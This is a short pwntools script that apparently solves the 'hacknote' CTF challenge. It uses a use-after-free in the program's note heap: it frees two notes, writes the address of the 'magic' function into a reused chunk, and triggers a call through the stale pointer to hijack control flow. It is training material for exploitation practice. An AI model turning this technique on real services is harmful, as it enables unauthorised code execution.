#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

static_elf = ELF('./hacknote')
magic=static_elf.symbols['magic']
#magic = 0x0804898c
host = "127.0.0.1"
port = 8888

r = remote(host,port)

def addnote(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


addnote(16,"haha0")
addnote(16,"haha1")
delnote(0)
delnote(1)
ss=raw_input()
addnote(8,p32(magic))
printnote(0)
r.interactive()
